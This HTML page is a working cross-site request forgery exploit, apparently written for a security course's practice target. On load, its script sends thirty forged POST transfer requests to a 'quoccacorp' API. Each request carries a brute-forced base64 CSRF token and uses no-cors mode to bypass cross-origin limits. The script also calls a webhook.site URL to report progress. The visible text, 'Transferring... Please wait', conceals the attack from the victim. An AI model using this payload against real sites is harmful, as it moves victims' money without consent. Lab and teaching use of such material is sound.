<!DOCTYPE html>
<html>
<body>
    <script>
        fetch('https://webhook.site/77454a70-13b8-4032-89ad-f3b03119622b?a=0');
        const targetUrl = 'https://phish-me.quoccacorp.com/api/transfer';
        const myUsername = 'z5723016';
        const startNumber = 2093;
        async function doPhish() {
            for (let i = 0; i < 30; i++) {
                let currentNum = startNumber + i;
                // 将数字转回 Base64 格式，模仿原有的 token 格式
                let token = btoa(currentNum.toString());
                
                // 使用 fetch 发送传统的表单格式请求
                fetch(targetUrl, {
                    method: 'POST',
                    mode: 'no-cors', // 关键：绕过跨域限制
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `username=${myUsername}&amount=10&csrf_token=${encodeURIComponent(token)}`
                });

                fetch('https://webhook.site/77454a70-13b8-4032-89ad-f3b03119622b?a=1');
            }
        }

        doPhish();
    </script>
    <h2>Transferring... Please wait.</h2>
</body>
</html>
